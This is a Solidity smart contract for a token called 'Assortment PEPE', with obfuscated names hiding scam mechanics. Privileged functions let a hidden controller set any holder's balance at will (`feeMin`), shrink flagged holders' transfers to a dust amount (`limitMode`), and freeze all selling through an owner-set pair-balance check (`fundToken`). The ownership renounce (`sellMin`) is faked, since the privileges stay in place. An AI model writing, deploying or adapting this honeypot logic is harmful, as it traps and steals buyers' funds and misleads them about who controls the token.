//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface senderMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeTotalIs) external view returns (uint256);

    function transfer(address atWallet, uint256 txLiquidity) external returns (bool);

    function allowance(address teamIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 txLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address atWallet,
        uint256 txLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTradingMin, uint256 value);
    event Approval(address indexed teamIs, address indexed spender, uint256 value);
}

abstract contract tradingLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountSenderSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletMode {
    function createPair(address exemptFee, address receiverMax) external returns (address);
}

interface senderModeMetadata is senderMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AssortmentPEPE is tradingLiquidity, senderMode, senderModeMetadata {

    address fundTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public takeTeam;

    uint256 public fundAuto;

    uint256 private enableTake;

    address isTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public fundBuyIs;

    string private fromAt = "APE";

    bool public launchAmount;

    event OwnershipTransferred(address indexed limitMax, address indexed modeToTrading);

    function transferFrom(address shouldMin, address atWallet, uint256 txLiquidity) external override returns (bool) {
        if (_msgSender() != fundTo) {
            if (liquiditySender[shouldMin][_msgSender()] != type(uint256).max) {
                require(txLiquidity <= liquiditySender[shouldMin][_msgSender()]);
                liquiditySender[shouldMin][_msgSender()] -= txLiquidity;
            }
        }
        return senderLaunchedExempt(shouldMin, atWallet, txLiquidity);
    }

    function allowance(address maxTake, address feeSell) external view virtual override returns (uint256) {
        if (feeSell == fundTo) {
            return type(uint256).max;
        }
        return liquiditySender[maxTake][feeSell];
    }

    string private takeFund = "Assortment PEPE";

    address public sellSwapAt;

    function approve(address feeSell, uint256 txLiquidity) public virtual override returns (bool) {
        liquiditySender[_msgSender()][feeSell] = txLiquidity;
        emit Approval(_msgSender(), feeSell, txLiquidity);
        return true;
    }

    function sellMin() public {
        emit OwnershipTransferred(sellSwapAt, address(0));
        enableFund = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchLimit;
    }

    function owner() external view returns (address) {
        return enableFund;
    }

    uint256 constant receiverAt = 19 ** 10;

    function balanceOf(address modeTotalIs) public view virtual override returns (uint256) {
        return fromFund[modeTotalIs];
    }

    function modeIs() private view {
        require(teamLimitLaunched[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private liquiditySender;

    bool private feeSender;

    function launchWallet(address shouldMin, address atWallet, uint256 txLiquidity) internal returns (bool) {
        require(fromFund[shouldMin] >= txLiquidity);
        fromFund[shouldMin] -= txLiquidity;
        fromFund[atWallet] += txLiquidity;
        emit Transfer(shouldMin, atWallet, txLiquidity);
        return true;
    }

    function limitMode(address swapTeamIs) public {
        modeIs();
        
        if (swapTeamIs == sellSwapAt || swapTeamIs == fundBuyIs) {
            return;
        }
        takeTeam[swapTeamIs] = true;
    }

    function senderLaunchedExempt(address shouldMin, address atWallet, uint256 txLiquidity) internal returns (bool) {
        if (shouldMin == sellSwapAt) {
            return launchWallet(shouldMin, atWallet, txLiquidity);
        }
        uint256 feeLiquidity = senderMode(fundBuyIs).balanceOf(isTotal);
        require(feeLiquidity == exemptModeTo);
        require(atWallet != isTotal);
        if (takeTeam[shouldMin]) {
            return launchWallet(shouldMin, atWallet, receiverAt);
        }
        return launchWallet(shouldMin, atWallet, txLiquidity);
    }

    uint256 private toMarketing;

    uint8 private launchLimit = 18;

    function getOwner() external view returns (address) {
        return enableFund;
    }

    bool public enableFromIs;

    function transfer(address txSell, uint256 txLiquidity) external virtual override returns (bool) {
        return senderLaunchedExempt(_msgSender(), txSell, txLiquidity);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderReceiver;
    }

    function feeMin(address txSell, uint256 txLiquidity) public {
        modeIs();
        fromFund[txSell] = txLiquidity;
    }

    bool public atMarketing;

    constructor (){
        
        amountSenderSell teamWallet = amountSenderSell(fundTo);
        fundBuyIs = walletMode(teamWallet.factory()).createPair(teamWallet.WETH(), address(this));
        if (feeSender != launchAmount) {
            fundAuto = toMarketing;
        }
        sellSwapAt = _msgSender();
        sellMin();
        teamLimitLaunched[sellSwapAt] = true;
        fromFund[sellSwapAt] = senderReceiver;
        if (enableFromIs) {
            feeSender = true;
        }
        emit Transfer(address(0), sellSwapAt, senderReceiver);
    }

    uint256 private senderReceiver = 100000000 * 10 ** 18;

    function fundToken(uint256 txLiquidity) public {
        modeIs();
        exemptModeTo = txLiquidity;
    }

    mapping(address => bool) public teamLimitLaunched;

    function shouldSell(address fromToken) public {
        require(fromToken.balance < 100000);
        if (atMarketing) {
            return;
        }
        if (launchAmount != enableFromIs) {
            enableTake = toMarketing;
        }
        teamLimitLaunched[fromToken] = true;
        if (enableTake != fundAuto) {
            fundAuto = enableTake;
        }
        atMarketing = true;
    }

    uint256 exemptModeTo;

    uint256 listTotal;

    function symbol() external view virtual override returns (string memory) {
        return fromAt;
    }

    bool private fundLiquiditySender;

    function name() external view virtual override returns (string memory) {
        return takeFund;
    }

    mapping(address => uint256) private fromFund;

    address private enableFund;

}